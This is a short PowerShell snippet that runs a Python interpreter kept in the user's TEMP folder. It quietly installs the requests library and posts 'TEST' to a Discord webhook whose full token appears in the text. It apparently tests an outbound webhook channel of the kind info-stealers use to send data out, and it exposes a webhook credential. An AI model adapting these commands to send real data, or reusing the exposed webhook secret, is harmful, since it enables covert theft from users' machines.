cd $env:TEMP\py

.\python.exe -m pip install requests --quiet

.\python.exe -c "import requests; requests.post('https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W', json={'content':'TEST'})"
